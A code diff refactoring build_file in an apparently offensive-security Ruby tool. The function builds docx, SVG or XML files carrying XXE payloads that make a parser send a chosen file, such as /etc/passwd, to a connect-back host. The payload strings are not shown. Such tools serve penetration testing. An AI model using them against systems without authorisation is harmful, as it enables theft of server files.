@@ -38,13 +38,14 @@ def oxml_file_defaults()
   return d
 end
 
+# This is the most basic option. Given an exploit type, what to exploit (e.g. /etc/passwd) and
+#   a file type it will build an oxml xxe.
 def build_file(params)
   # proto (required): protocol on connect back
   # hostname (required): hostname to connect to
-  # file (required): the file to write
-  # file_type
-  # xml_file
-  #
+  # file_type (required): file extension -- e.g. docx
+  # hostname (required): connect back host -- this is confusing as it's not used by every combination
+
   oxmls = oxml_file_defaults()
   pl = read_payloads()
 
@@ -55,21 +56,20 @@ def build_file(params)
     ip = params["proto"]+"://"+params["hostname"]
   end
 
-  if params[:file] != nil
-    # TODO support svg
-    # TODO support xml
-    input_file = params[:file][:tempfile].read
-    nname = "temp_#{Time.now.to_i}_"
-    ext = params[:file][:filename].split('.').last
-    rand_file = "./output/#{nname}_z.#{ext}"
-    File.open(rand_file, 'wb') {|f| f.write(input_file) }
-    file_exploit = rand_file
+  # This takes in a file type and picks the file from the samples.
+  input_file = oxmls[params["file_type"]][0]
+  if input_file == ""
+    raise StandardError, "Error: File could not be found based on file_type"
   end
 
+  nname = "temp_#{Time.now.to_i}_"
+  ext = params["file_type"]
+  rand_file = "./output/#{nname}_z.#{ext}"
+  # Make a copy of the sample and place it into the rand_file
+  FileUtils::copy_file(input_file,rand_file)
+
   if oxmls.include?(params["file_type"])
-    xml_file = params["xml_file"].size > 0 ? params["xml_file"] : oxmls[params["file_type"]][1]
-    file_exploit = oxmls[params["file_type"]][0]
-    fn = insert_payload_docx(file_exploit,xml_file,pl[params["payload"]][0],ip,params["exfil_file"])
+    fn = string_replace(pl[params["payload"]][0],rand_file,ip,params["exfil_file"])
   elsif params["file_type"] == "svg"
     fn = insert_payload_svg("./samples/sample.svg",pl[params["payload"]][0],ip,params["exfil_file"])
   elsif params["file_type"] == "xml"
